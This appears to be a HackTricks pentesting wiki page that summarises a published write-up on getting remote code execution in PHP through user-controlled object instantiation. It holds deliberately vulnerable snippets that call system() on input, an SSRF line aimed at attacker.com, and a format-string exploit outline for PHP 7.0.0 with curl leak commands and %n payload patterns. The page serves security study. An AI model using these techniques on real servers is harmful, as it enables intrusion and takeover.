_body: "# PHP - RCE abusing object creation: new $_GET[\"a\"]($_GET[\"b\"])\n\n{{#include ../../../banners/hacktricks-training.md}}\n\
  \nThis is basically a summary of [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)\n\
  \n## Introduction\n\nThe creation of new arbitrary objects, such as `new $_GET[\"a\"]($_GET[\"a\"])`, can lead to Remote\
  \ Code Execution (RCE), as detailed in a [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/).\
  \ This document highlights various strategies for achieving RCE.\n\n## RCE via Custom Classes or Autoloading\n\nThe syntax\
  \ `new $a($b)` is used to instantiate an object where **`$a`** represents the class name and **`$b`** is the first argument\
  \ passed to the constructor. These variables can be sourced from user inputs like GET/POST, where they may be strings or\
  \ arrays, or from JSON, where they might present as other types.\n\nConsider the code snippet below:\n\n```php\nclass App\
  \ {\n    function __construct ($cmd) {\n        system($cmd);\n    }\n}\n\nclass App2 {\n    function App2 ($cmd) {\n  \
  \      system($cmd);\n    }\n}\n\n$a = $_GET['a'];\n$b = $_GET['b'];\n\nnew $a($b);\n```\n\nIn this instance, setting `$a`\
  \ to `App` or `App2` and `$b` to a system command (e.g., `uname -a`) results in the execution of that command.\n\n**Autoloading\
  \ functions** can be exploited if no such classes are directly accessible. These functions automatically load classes from\
  \ files when needed and are defined using `spl_autoload_register` or `__autoload`:\n\n```php\nspl_autoload_register(function\
  \ ($class_name) {\n    include './../classes/' . $class_name . '.php';\n});\n\nfunction __autoload($class_name) {\n    include\
  \ $class_name . '.php';\n};\n\nspl_autoload_register();\n```\n\nThe behavior of autoloading varies with PHP versions, offering\
  \ different RCE possibilities.\n\n## RCE via Built-In Classes\n\nLacking custom classes or autoloaders, **built-in PHP classes**\
  \ may suffice for RCE. The number of these classes ranges between 100 to 200, based on PHP version and extensions. They\
  \ can be listed using `get_declared_classes()`.\n\nConstructors of interest can be identified through the reflection API,\
  \ as shown in the following example and the link [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).\n\n**RCE via specific\
  \ methods includes:**\n\n### **SSRF + Phar Deserialization**\n\nThe `SplFileObject` class enables SSRF through its constructor,\
  \ allowing connections to any URL:\n\n```php\nnew SplFileObject('http://attacker.com/');\n```\n\nSSRF can lead to deserialization\
  \ attacks in versions of PHP before 8.0 using the Phar protocol.\n\n### **Exploiting PDOs**\n\nThe PDO class constructor\
  \ allows connections to databases via DSN strings, potentially enabling file creation or other interactions:\n\n```php\n\
  new PDO(\"sqlite:/tmp/test.txt\")\n```\n\n### **SoapClient/SimpleXMLElement XXE**\n\nVersions of PHP up to 5.3.22 and 5.4.12\
  \ were susceptible to XXE attacks through the `SoapClient` and `SimpleXMLElement` constructors, contingent on the version\
  \ of libxml2.\n\n## RCE via Imagick Extension\n\nIn the analysis of a **project's dependencies**, it was discovered that\
  \ **Imagick** could be leveraged for **command execution** by instantiating new objects. This presents an opportunity for\
  \ exploiting vulnerabilities.\n\n### VID parser\n\nThe VID parser capability of writing content to any specified path in\
  \ the filesystem was identified. This could lead to the placement of a PHP shell in a web-accessible directory, achieving\
  \ Remote Code Execution (RCE).\n\n#### VID Parser + File Upload\n\nIt's noted that PHP temporarily stores uploaded files\
  \ in `/tmp/phpXXXXXX`. The VID parser in Imagick, utilizing the **msl** protocol, can handle wildcards in file paths, facilitating\
  \ the transfer of the temporary file to a chosen location. This method offers an additional approach to achieve arbitrary\
  \ file writing within the filesystem.\n\n### PHP Crash + Brute Force\n\nA method described in the [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)\
  \ involves uploading files that trigger a server crash before deletion. By brute-forcing the name of the temporary file,\
  \ it becomes possible for Imagick to execute arbitrary PHP code. However, this technique was found to be effective only\
  \ in an outdated version of ImageMagick.\n\n## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)\n\nWhen user\
  \ input controls the class name (e.g., `new $_GET['model']()`), PHP 7.0.0 introduced a transient bug during the `Throwable`\
  \ refactor where the engine mistakenly treated the class name as a printf format string during resolution. This enables\
  \ classic printf-style primitives inside PHP: leaks with `%p`, write-count control with width specifiers, and arbitrary\
  \ writes with `%n` against in-process pointers (for example, GOT entries on ELF builds).\n\nMinimal repro vulnerable pattern:\n\
  \n```php\n<?php\n$model = $_GET['model'];\n$object = new $model();\n```\n\nExploitation outline (from the reference):\n\
  - Leak addresses via `%p` in the class name to find a writable target:\n  ```bash\n  curl \"http://host/index.php?model=%p-%p-%p\"\
  \n  # Fatal error includes resolved string with leaked pointers\n  ```\n- Use positional parameters and width specifiers\
  \ to set an exact byte-count, then `%n` to write that value to an address reachable on the stack, aiming at a GOT slot (e.g.,\
  \ `free`) to partially overwrite it to `system`.\n- Trigger the hijacked function by passing a class name containing a shell\
  \ pipe to reach `system(\"id\")`.\n\nNotes:\n- Works only on PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105));\
  \ fixed in subsequent releases. Severity: critical if arbitrary class instantiation exists.\n- Typical payloads chain many\
  \ `%p` to walk the stack, then `%.<width>d%<pos>$n` to land the partial overwrite.\n\n## References\n\n- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)\n\
